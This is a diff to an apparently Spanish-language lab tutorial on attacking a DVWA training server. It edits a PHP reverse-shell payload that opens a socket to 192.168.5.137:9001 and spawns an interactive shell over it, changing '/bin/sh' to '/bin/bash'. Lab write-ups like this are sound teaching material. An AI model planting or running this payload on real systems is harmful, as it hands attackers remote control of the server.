@@ -11,7 +11,7 @@ En esta sección se lleva a cabo un ejemplo de ataque utilizando esta vulnerabil
 $ip=192.168.5.137; #IP del servidor DVWA
 $port=9001; #Puerto de escucha
 $sock=fsockopen($ip, $port);
-exec("bin/sh -i <&3 >&3 2>&3");
+exec("bin/bash -i <&3 >&3 2>&3");
 
 ?>
 ```
